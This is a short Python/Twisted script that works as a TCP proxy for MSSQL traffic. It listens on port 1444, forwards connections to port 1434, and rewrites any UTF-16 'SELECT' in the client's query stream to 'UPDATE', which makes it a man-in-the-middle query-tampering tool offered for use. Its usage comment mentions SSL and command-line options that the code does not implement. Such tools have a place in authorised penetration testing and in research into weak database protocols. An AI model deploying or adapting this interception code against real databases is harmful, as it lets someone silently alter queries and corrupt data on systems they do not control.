#!/usr/bin/env python

# Provided under GNU General Public License v3.0
# See the accompanying LICENSE file for more information.
# Author:
#   Marcin Ochab d3Fr4gM3ntaT0r
#
# inspired by: 
#   https://gist.github.com/thinkst/db909e3a41c5cb07d43f
#
# use with: ./mssql-proxy_ssl.py3 192.168.123.2 -d -lcp 1444

from twisted.internet import protocol, reactor

class ExampleServerProtocol(protocol.Protocol):
    def __init__(self):
        self.buffer = None
        self.client = None
 
    def connectionMade(self):
        factory = protocol.ClientFactory()
        factory.protocol = ExampleClientProtocol
        factory.server = self
        reactor.connectTCP("127.0.0.1", 1434, factory)
        print("new connection")
 
    def dataReceived(self, data):
        i = data.find("SELECT".encode('utf-16le'))
        if i > -1:
            print("FOUND: SELECT - replacing to UPDATE")
            rstr = "UPDATE".encode('utf-16le')
            data = data[:i] + rstr + data[i + len(rstr):]
        if self.client:
            self.client.write(data)
        else:
            self.buffer = data
 
    def write(self, data):
        self.transport.write(data)
 
 
class ExampleClientProtocol(protocol.Protocol):
    def connectionMade(self):
        self.factory.server.client = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''
 
    def dataReceived(self, data):
        self.factory.server.write(data)
 
    def write(self, data):
        if data:
            self.transport.write(data) 

def main():
    factory = protocol.ServerFactory()
    factory.protocol = ExampleServerProtocol
    reactor.listenTCP(1444, factory)
    reactor.run()

if __name__ == '__main__':
    main()